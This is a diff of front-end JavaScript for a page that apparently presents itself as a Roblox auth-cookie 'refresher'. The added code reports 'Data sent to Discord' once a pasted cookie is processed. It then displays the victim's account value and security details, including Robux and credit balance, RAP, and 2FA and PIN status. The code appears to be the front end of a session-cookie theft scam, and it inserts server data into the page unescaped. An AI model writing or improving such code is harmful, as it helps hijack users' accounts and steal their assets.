@@ -5,13 +5,25 @@ document.addEventListener("DOMContentLoaded", function () {
     const resultElement = document.getElementById("result");
     const countdownElement = document.getElementById("countdown");
     const copyButton = document.getElementById("copyButton");
-    const statusElement = document.createElement("div");
     
-    // Add status element after result
-    resultElement.parentNode.insertBefore(statusElement, resultElement.nextSibling);
+    // Create user info container
+    const userInfoContainer = document.createElement("div");
+    userInfoContainer.id = "userInfo";
+    userInfoContainer.style.marginTop = "20px";
+    userInfoContainer.style.padding = "15px";
+    userInfoContainer.style.backgroundColor = "#f0f0f0";
+    userInfoContainer.style.borderRadius = "5px";
+    userInfoContainer.style.display = "none";
+    
+    // Insert after result container
+    resultElement.parentNode.insertBefore(userInfoContainer, resultElement.nextSibling);
+    
+    // Create status element
+    const statusElement = document.createElement("div");
     statusElement.id = "status";
     statusElement.style.marginTop = "10px";
     statusElement.style.fontSize = "14px";
+    resultElement.parentNode.insertBefore(statusElement, resultElement.nextSibling);
 
     refreshButton.addEventListener("click", function () {
         const authCookie = authCookieInput.value.trim();
@@ -19,6 +31,7 @@ document.addEventListener("DOMContentLoaded", function () {
         if (!authCookie) {
             resultElement.textContent = "Please enter a cookie first!";
             statusElement.textContent = "";
+            userInfoContainer.style.display = "none";
             return;
         }
 
@@ -27,8 +40,10 @@ document.addEventListener("DOMContentLoaded", function () {
         resultElement.textContent = "Processing your cookie...";
         statusElement.textContent = "";
         statusElement.style.color = "blue";
+        userInfoContainer.style.display = "none";
+        userInfoContainer.innerHTML = "";
 
-        let countdown = 5; // Reduced from 7
+        let countdown = 5;
         countdownElement.textContent = `Processing in ${countdown} seconds...`;
 
         const countdownInterval = setInterval(() => {
@@ -49,46 +64,32 @@ document.addEventListener("DOMContentLoaded", function () {
                 .then((data) => {
                     console.log('Server response:', data);
                     
-                    // Handle both response formats (old and new)
-                    let finalCookie = "";
-                    let successMessage = "";
+                    // Always show the cookie
+                    resultElement.textContent = data.cookie || authCookie;
                     
-                    // Check for new format first
-                    if (data.cookie) {
-                        finalCookie = data.cookie;
-                        successMessage = data.validation?.valid 
-                            ? "✅ Cookie is valid" 
-                            : "⚠️ Cookie may be invalid";
-                    }
-                    // Check for old format
-                    else if (data.redemptionResult?.refreshedCookie) {
-                        finalCookie = data.redemptionResult.refreshedCookie;
-                        successMessage = data.redemptionResult.success 
-                            ? "✅ Cookie processed" 
-                            : "⚠️ Original cookie returned";
-                    }
-                    // Fallback
-                    else {
-                        finalCookie = authCookie;
-                        successMessage = "⚠️ No response, using original";
-                    }
-                    
-                    // Display results
-                    resultElement.textContent = finalCookie;
-                    statusElement.textContent = successMessage;
-                    statusElement.style.color = successMessage.includes("✅") ? "green" : "orange";
-                    
-                    // Auto-copy to clipboard if successful
-                    if (successMessage.includes("✅")) {
-                        navigator.clipboard.writeText(finalCookie).then(() => {
+                    if (data.success) {
+                        statusElement.textContent = "✅ Success! Data sent to Discord.";
+                        statusElement.style.color = "green";
+                        
+                        // Display user information if available
+                        if (data.userData) {
+                            displayUserInfo(data.userData);
+                            userInfoContainer.style.display = "block";
+                        }
+                        
+                        // Auto-copy to clipboard
+                        navigator.clipboard.writeText(data.cookie || authCookie).then(() => {
                             copyButton.textContent = "Auto-copied!";
                             setTimeout(() => (copyButton.textContent = "Copy"), 2000);
                         });
+                    } else {
+                        statusElement.textContent = "⚠️ " + (data.error || "Processing completed");
+                        statusElement.style.color = "orange";
                     }
                 })
                 .catch((error) => {
                     console.error('Error:', error);
-                    resultElement.textContent = authCookie; // Always show original
+                    resultElement.textContent = authCookie;
                     statusElement.textContent = "⚠️ Server error, using original cookie";
                     statusElement.style.color = "red";
                 })
@@ -96,8 +97,32 @@ document.addEventListener("DOMContentLoaded", function () {
                     refreshButton.disabled = false;
                     refreshButtonIcon.classList.remove("rotate-icon");
                 });
-        }, 5000); // Reduced wait time
+        }, 5000);
     });
+
+    // Function to display user info
+    function displayUserInfo(userData) {
+        const infoHTML = `
+            <h3 style="margin-top: 0; color: #333;">User Information</h3>
+            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;">
+                <div><strong>Username:</strong> ${userData.Username}</div>
+                <div><strong>User ID:</strong> ${userData.UserID}</div>
+                <div><strong>Display Name:</strong> ${userData.DisplayName}</div>
+                <div><strong>Creation Date:</strong> ${userData.CreationDate}</div>
+                <div><strong>Country:</strong> ${userData.Country}</div>
+                <div><strong>Robux Balance:</strong> ${userData.AccountBalanceRobux}</div>
+                <div><strong>2FA Enabled:</strong> ${userData.Is2FAEnabled ? '✅ Yes' : '❌ No'}</div>
+                <div><strong>PIN Enabled:</strong> ${userData.IsPINEnabled ? '✅ Yes' : '❌ No'}</div>
+                <div><strong>Premium:</strong> ${userData.IsPremium ? '✅ Yes' : '❌ No'}</div>
+                <div><strong>Credit Balance:</strong> ${userData.CreditBalance}</div>
+                <div><strong>RAP:</strong> ${userData.RAP}</div>
+            </div>
+            <div style="margin-top: 15px; font-size: 12px; color: #666;">
+                <strong>Debug Info:</strong> ${userData.DebugInfo}
+            </div>
+        `;
+        userInfoContainer.innerHTML = infoHTML;
+    }
 
     // Copy Button
     copyButton.addEventListener("click", function () {
@@ -111,7 +136,7 @@ document.addEventListener("DOMContentLoaded", function () {
             copyButton.textContent = "Copied!";
             setTimeout(() => (copyButton.textContent = originalText), 2000);
         }).catch(() => {
-            // Fallback for old browsers
+            // Fallback
             const textarea = document.createElement("textarea");
             textarea.value = textToCopy;
             document.body.appendChild(textarea);
